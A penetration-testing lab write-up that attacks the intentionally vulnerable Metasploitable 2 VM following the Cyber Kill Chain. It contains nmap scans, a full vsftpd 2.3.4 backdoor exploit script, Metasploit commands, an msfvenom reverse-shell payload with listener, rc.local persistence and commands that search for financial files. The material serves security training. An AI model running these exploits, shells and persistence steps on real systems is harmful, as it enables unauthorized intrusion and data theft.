## Table of Contents
[Introduction](#introduction) 
[Lab Setup](#lab-setup) 
[Attack Profile](#attack-profile) 
[Threat Simulation](#threat-simulation)
	[1. Reconnaissance](#1-reconnaissance)
	[2. Weaponisation](#2-weaponisation)
	[3. Delivery](#3-delivery) 
	[4. Exploitation](#4-exploitation) 
	[5. Installation](#5-installation) 
	[6. Command & Control (C2)](#6-command--control-c2) 
	[7. Actions On Objectives](#7-actions-on-objectives)
[Mitigation Report](#mitigation-report)

--- 
## Introduction

From [Sourceforge](https://sourceforge.net/projects/metasploitable/) uploaded by **Rapid7User**-
>*"**Metasploitable** is an intentionally vulnerable Linux virtual machine. This VM can be used to conduct security training, test security tools, and practice common penetration testing techniques."*

Created by H.D Moore of Rapid 7, Metasploitable 2 is a virtual machine that is intentionally designed to be insecure as a test environment for security researchers to carry out vulnerability analysis on a live system. 

At the time of writing this, the last update released for Metasploitable 2 was 2019-08-19. 

Lockheed Martin's [Cyber Kill Chain®](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)is the basis for the steps that I will follow throughout my Threat Analysis, it will also serve as the structure for the documentation process. 

For this testing, I will be utilising the [MITRE ATT&CK®](https://attack.mitre.org/) knowledge base and framework. Throughout my analysis, the Tactics, Techniques, and Procedures (TTPs) will be directly mapped to this framework. I have chosen this resource because it offers a comprehensive and robust representation of real-world adversarial behaviours, making it ideal for guiding my approach.

For a security researcher to properly carry out realistic testing they first have to create an adversary profile, this profile aids in defining the type of attack that they will be carrying out. The profile will be representative of the attacker they are simulating, as different attackers have a variety of capabilities, objectives and resources. Profiles are created that best match the likely attacker of the system in question and can include Nation-States, Cybercriminals and Hacktivists. 

---

## Lab Setup

Detailing the exact environment used in testing ensures reproducibility, allowing others to conduct the same tests. It provides context, explaining the conditions under which the tests were carried out, and enhances credibility by demonstrating that the actions taken are realistic. Thorough documentation aids troubleshooting by allowing others to replicate the environment and resolve issues, and invites constructive criticism, fostering shared learning and progression in the field.

To create a realistic environment for testing I used virtualisation software, this negates the need to have multiple physical devices, eliminating costs and allowing rapid deployability whilst maintaining accuracy to real-world conditions. The virtualisation software I have used is [VirtualBox](https://www.virtualbox.org/), it is common and free to use. 

Throughout testing I will use *VirtualBox Graphical User Interface Version 7.0.22 r165102 (Qt5.15.8)* on *Debian GNU/Linux 12 (bookworm) x86_64* for my host machine. On VirtualBox, I have: [Metasploitable](https://sourceforge.net/projects/metasploitable/)and [Kali Linux](https://cdimage.kali.org/kali-2024.4/kali-linux-2024.4-virtualbox-amd64.7z). My virtual machines are able to network over an Internal Network configured in the settings of each machine.

The current setup I am using is very rudimentary and is doesn't reflect the full network stack that would exist in a real world attack. But will suffice in the testing of the Metasploitable. 

---

## Attack Profile

From [Trend Micro](https://www.trendmicro.com/vinfo/gb/security/definition/cybercriminals) -
> *"**Cybercriminals** are individuals or teams of people who use technology to commit malicious activities on digital systems or networks with the intention of stealing sensitive company information or personal data, and generating profit."*

The motivation of my attacker is to gain access to the target system to gain sensitive information and control of the system to facilitate financial fraud in the now and to facilitate persistent access for further attacks. If initial access is made and the system does not hold the information desired, monetisation of the attack can be made through different avenues (I.E. Ransomware and key-loggers)

The capabilities of my attacker will be that of a low-level "hacker-for-hire" meaning they will be able to use basic scripts and open-source exploits.

My attacker was hired through a deep web forum where they posted their services. Subsequently, a client reached out with a request to carry out an attack on the machine in order to steal financial information. The information was very limited but included an IP address.


---

# Threat Simulation


## 1. Reconnaissance

[Active Scanning - T1595](https://attack.mitre.org/techniques/T1595/) [Application Layer Protocol T1071](https://attack.mitre.org/techniques/T1071/)
By using widely available tools like [NMAP](https://nmap.org/) (CLI) and [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)(GUI) to scan the target system I am able to assess which ports are open on the system and the services that are running on those ports. For this attack, I will perform a loud scan that is very effective but would quite easily be detected. 

```bash
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.1.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 11:34 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.1.10
Host is up (0.000074s latency).
Not shown: 978 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8180/tcp open  unknown
MAC Address: 08:00:27:A8:91:8F (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```
The results of the scan show a list of services that are running on the machine. Even without knowing the versions of these services I can see services like telnet and ftp that are deprecated and insecure.

Now that I am aware that there are ports open and internet facing services running I can once again use NMAP to query the service versions, this information can be used to guide my choice in the weaponisation of  my attack.

``` bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.1.10                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 03:18 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 21.74% done; ETC: 03:18 (0:00:04 remaining)
Nmap scan report for 192.168.1.10
Host is up (0.000051s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:A8:91:8F (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.71 seconds
```
Now that we have the service versions available we can proceed on to the weaponisation stage.

---

## 2. Weaponisation

Before attempting a physical attack it is imperative that we begin creating a plan that is tailored to our situation and by selecting our tools early on we can research the capabilities or discover weaknesses.

Our initial recon has given us the information we need to search for known vulnerabilities. Searching services and their versions in [Exploit DB](https://www.exploit-db.com) and [Msfconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/) reveals that the services running on the machine are outdated and contain a variety of known exploits. 

[Exploit Public-Facing Application - T1190](https://attack.mitre.org/techniques/T1190/)
**vsftpd 2.3.4** is an open-source FTP server used for file transfer in Unix-like operating systems. This is particularly useful for threat actors to enable data exfiltration as this service is designed for file transfer across networks. Searching the service name and version on exploit-db **"vsftp 2.3.4"** reveals that there is a known vulnerability that allows backdoor command execution on machines that use this version of vsftpd. [NIST](https://www.nist.gov/) has created a CVE listing for this vulnerability [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) with the description:
>*"vsftpd 2.3.4 downloaded between 20110630 and 20110703 contains a backdoor which opens a shell on port 6200/tcp."*

Backdoors are hidden entry points that allow direct unauthorised access into applications, systems and networks. In the case of CVE-2011-2523, the package that was distributed allowed users to login to the server with a **:)** and gain a command shell on port **6200**

The Exploit-db listing also contains a python script which can be used to exploit this vulnerability. 
``` python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
            
```

This python script can be easily ran within the terminal.
``` bash
python3 vsftpd_exploit_db.py <ip>
```

Msfconsole also includes a module to exploit this vulnerability easily.

``` msfconsole
msf > use exploit/unix/ftp/vsftpd_234_backdoor 
msf exploit(vsftpd_234_backdoor) > show targets 
	...targets... 
msf exploit(vsftpd_234_backdoor) > set TARGET < target-id > 
msf exploit(vsftpd_234_backdoor) > show options 
	...show and set options... 
msf exploit(vsftpd_234_backdoor) > exploit
```

Researching of the vulnerability highlights that the backdoor created only allows arbitrary code execution within the context of the FTP service, this is incredibly powerful alone but may cause issues in full compromisation of the system. To combat that we would need to set up a interactive shell that gives unrestricted access to the system.

Using msfconsole we can create a payload  for a interactive reverse shell that can be uploaded and executed on the target machine. After the file is executed on the target it creates a shell on port 4444 which our target machine will need to be set up to listen for

``` bash
### msfvenom reverse shell payload generation

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.20 LPORT=4444 -f elf > /tmp/reverse_shell.elf
```
 
``` msfconsole
### msfconsole listener 

use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.1.20
set LPORT 4444
run
```

Now that we have our interactive shell we can set up persistence as at any time we can lose our shell because of a system restart. By putting our payload into a system startup location we ensure that if our target notices that they have been compromised then restarting the machine will not lock us out.

``` bash
### appending rc.local with a command that executes our payload, ensuring it is ran on startup

echo "/bin/bash -i < /tmp/reverse_shell.elf &" >> /etc/rc.local

### making it executable

chmod +x /etc/rc.local
```


---

## 3. Delivery 

To begin our attack we first create the payload using msfvenom that will be uploaded to the machine once we have exploited the vsftpd vulnerability. This payload will create a reverse shell that my msfconsole will be set to listen for. This gives me more capabilities when using msfconsole.

![Creating payload](images/Creating%20payload.png)
Serving the payload using a python3 server

![Python server](images/Python%20server.png)
Starting the msfconsole listener for my payload as a background job so that when I come to execute it msfconsole connects straight away

![Msfconsole listener](images/Msfconsole%20listener.png)

---

## 4. Exploitation 

Executing the vsftpd_234_backdoor module exploit using msfconsole
![Backdoor module](images/Backdoor%20module.png)

Downloading and executing the payload
![Downloading payload](images/Downloading%20payload.png)

We now have a reverse shell on the target machine
![Reverse shell success](images/Reverse%20shell%20success.png)

---

## 5. Installation

Using the shell command from meterpreter I can get a full system shell on the machine
![Shell meterpreter command](images/Shell%20meterpreter%20command.png)

Ensuring the shell is still active on restart
![Persistence](images/Persistence.png)
---

## 6. Command & Control (C2)

As this analysis is only concerned with a single attack, no C2 architecture has been setup. 

---

## 7. Actions On Objectives

As we have been tasked with executing an attack on the targets finances we can use our access to search the machine for files relating to bank statements, company spreadsheets, card information, cryptocurrency wallets etc. To facilitate this we can use many terminal commands that search for files related to this.

``` bash
find / -type f \( -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.csv" -o -iname "*.pdf" -o -iname "*.docx" \) 2>/dev/null

grep -ril "invoice\|payment\|balance\|account\|financial" /

```

Metasploitable is not setup simulate this but running this command and seeing what results we do find is a good proof of concept of the capabilities of attackers in this regard.

---

*This document is intended for educational and informational purposes only. The techniques and methods described herein should not be used for any unauthorized or illegal activities. All activities performed during this exercise were conducted in a controlled environment with explicit consent from the system owner. The author takes no responsibility for any misuse of the information provided in this document.*
